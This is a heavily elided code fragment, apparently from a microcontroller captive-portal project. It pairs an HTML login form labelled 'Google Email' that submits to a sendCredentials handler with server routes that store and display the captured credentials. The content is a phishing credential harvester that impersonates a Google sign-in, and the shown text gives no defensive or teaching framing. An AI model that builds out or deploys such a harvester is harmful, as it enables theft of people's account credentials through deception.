...
<html>
  ...
  <body>
    ...
    <form onsubmit="sendCredentials(event)">
      <input type="text" id="username" name="username" placeholder="Google Email" required><br>
...
void setup() {
  ...
  server.on("/getcreds", HTTP_POST, handlePostCreds); // Store credentials
  server.on("/getcreds", HTTP_GET, handleGetCreds);   // Display credentials
